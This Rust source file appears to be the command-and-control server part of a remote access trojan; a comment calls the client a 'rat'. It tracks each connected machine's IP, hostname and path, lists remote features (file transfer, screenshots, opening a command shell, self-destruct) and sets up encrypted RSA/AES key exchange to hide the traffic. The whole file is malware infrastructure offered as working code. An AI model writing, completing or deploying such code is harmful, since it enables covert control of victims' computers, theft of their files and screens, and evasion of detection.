use core::str;
use std::net::{IpAddr, SocketAddr};

use aes_gcm::{aead::Aead, Aes256Gcm, KeyInit, Nonce};
use futures_util::{
    stream::{SplitSink, SplitStream},
    SinkExt, StreamExt,
};
use rand::{rngs::OsRng, RngCore};
use rsa::{
    pkcs1::{DecodeRsaPublicKey, EncodeRsaPrivateKey, EncodeRsaPublicKey},
    Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
};
use tokio_tungstenite::WebSocketStream;
use tungstenite::Message;

use crate::connector_server::hybrid_encryption::{encrypt_data_combined, generate_private_key};

use super::hybrid_encryption::{encrypt_data, HybridEncryptionResult};

pub const FEATURES: [&str; 5] = [
    "update",
    "start_file_transfer",
    "send_screenshot",
    "open_cmd",
    "self_destruct",
];
#[derive(Debug)]
#[allow(dead_code)]
pub struct Instance {
    ip: IpAddr,
    write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
    read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
    hostname: String,
    public_key: Option<RsaPublicKey>,
    private_key: Option<RsaPrivateKey>,
    path: String,
}
impl Instance {
    pub fn new(
        addr: SocketAddr,
        write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
        read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
        hostname: String,
        path: String,
    ) -> Instance {
        Instance {
            ip: addr.ip(),
            write,
            read,
            hostname,
            public_key: None,
            private_key: None,
            path,
        }
    }
    pub fn init_old(
        addr: SocketAddr,
        write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
        read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
        hostname: String,
        public_key: Option<RsaPublicKey>,
        private_key: Option<RsaPrivateKey>,
        path: String,
    ) -> Instance {
        Instance {
            ip: addr.ip(),
            write,
            read,
            hostname,
            public_key,
            private_key,
            path,
        }
    }
    pub fn get_ip(&self) -> IpAddr {
        self.ip
    }
    pub fn get_hostname(&self) -> &str {
        &self.hostname
    }
    pub fn get_path(&self) -> &str {
        &self.path
    }
    pub fn set_public_key(&mut self, public_key: RsaPublicKey) {
        self.public_key = Some(public_key);
    }
    pub fn set_private_key(&mut self, private_key: RsaPrivateKey) {
        self.private_key = Some(private_key);
    }
    pub fn is_keys_init(&self) -> bool {
        if self.public_key.is_none() || self.private_key.is_none() {
            return false;
        }
        true
    }
    pub async fn send_message(&mut self, message: &str) {
        self.write.send(Message::from(message)).await.unwrap();
    }
    pub async fn send_encrypted_message(&mut self, message: &str) {
        let encrypted_data = encrypt_data(self.public_key.clone().unwrap(), message.as_bytes());
        //dont need hex cuz Aes
        self.write
            .send(Message::from(encrypted_data))
            .await
            .unwrap();
    }
    pub async fn init_keys(&mut self) -> (String, String) {
        //Send pong for rat to generate a public key
        self.send_message("pong").await;

        let mut public_key = String::from("");
        let mut private_key_string = String::from("");
        if let Some(message) = &self.read.next().await {
            public_key = message.as_ref().unwrap().to_string();
            //Generate private key and also assign it
            let private_key = generate_private_key();
            private_key_string = private_key
                .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
                .unwrap()
                .to_string();
            //Get public key from what user sends us
            self.set_public_key(RsaPublicKey::from_pkcs1_pem(public_key.as_str()).unwrap());
            self.set_private_key(private_key.to_owned());

            //Send my public key encrypted by users public key to user and forget about it
            let hybrid_encryption_result = encrypt_data_combined(
                self.public_key.clone().unwrap(),
                private_key
                    .to_public_key()
                    .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
                    .unwrap()
                    .into(),
            );
            self.send_message(hybrid_encryption_result.get_encrypted_key().as_str())
                .await;
            self.send_message(hybrid_encryption_result.get_nonce().as_str())
                .await;
            self.send_message(hybrid_encryption_result.get_encrypted_data().as_str())
                .await;
        }
        println!("rsa init sequence with complete");
        (public_key, private_key_string)
    }
}
